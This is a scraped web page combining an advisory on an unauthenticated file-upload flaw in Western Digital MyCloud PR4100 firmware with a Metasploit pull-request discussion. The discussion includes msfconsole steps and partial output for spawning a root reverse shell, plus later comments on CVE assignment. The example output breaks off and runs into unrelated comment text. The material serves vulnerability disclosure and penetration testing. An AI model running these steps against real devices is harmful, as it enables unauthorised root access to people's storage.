## Description

An issue was discovered on Western Digital MyCloud PR4100 2.30.172 devices. The web administration component, /web/jquery/uploader/multi\_uploadify.php, provides multipart upload functionality that is accessible without authentication and can be used to place a file anywhere on the device's file system. This allows an attacker the ability to upload a PHP shell onto the device and obtain arbitrary code execution as root.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### @Zenofex **[Zenofex](/Zenofex)** commented [Nov 28, 2017](#issue-277384749) • edited by busterb Loading

This pull request adds a Western Digital MyCloud unauthenticated command execution exploit.

`This module exploits a file upload vulnerability found in Western Digital's MyCloud NAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.php PHP script provides multipart upload functionality that is accessible without authentication and can be used to place a file anywhere on the device's file system. This allows an attacker the ability to upload a PHP shell onto the device and obtain arbitrary code execution as root.`

This module was tested successfully on a MyCloud PR4100 with firmware version 2.30.172

## Verification

* Start `msfconsole`
* `use exploit/linux/http/wd_mycloud_multiupload_upload`
* `set RHOST [IP]`
* `check`
* Verify device reported as vulnerable
* `run`
* Verify shell is spawned

## Example Output

```
msf > use exploit/linux/http/wd_mycloud_multiupload_upload
msf exploit(wd_mycloud_multiupload_upload) > set RHOST 192.168.86.104
RHOST => 192.168.86.104
msf exploit(wd_mycloud_multiupload_upload) > check
[+] 192.168.86.104:80 The target is vulnerable.
msf exploit(wd_mycloud_multiupload_upload) > run

[*] Started reverse TCP handler on 192.168.86.215:4444

And if this is the first place the vuln has been properly documented, feel free to add a link to this PR:

[#9248](https://github.com/rapid7/metasploit-framework/pull/9248)

If it's described in a published DEFCON talk, a link to that presentation or paper would be super handy, too.

| So there's no CVE or BID or any other kind of reference number or name on this module. I'm pretty sure I recall you mentioning that you already disclosed to the vendor before DEFCON -- did they assign a ticket number or anything? I just would like to follow up with them and ask if they'd like us to assign a CVE for this. |

| Welp, it's been 9 days I haven't heard anything back -- and according to our CNA agreement, we shan't be assigning a CVE unless the vendor acknowledges.  So, the lack of CVE shouldn't hold anything up, since we have decent secondary references. I'll bug CERT/CC and see if they can toss one our way. If so, I'll add it post-facto. |

| CVE Request 432582 for CVE ID filed. Bccause Western Digital has failed to acknowledge this vulnerability (despite the overwhelming evidence that it exists), Rapid7 is unable to assign a CVE ourselves. We've sent the request up to MITRE who can assign out of their block (we used to get these out of CERT/CC, but apparently that's now how it works anymore, which is fine). |
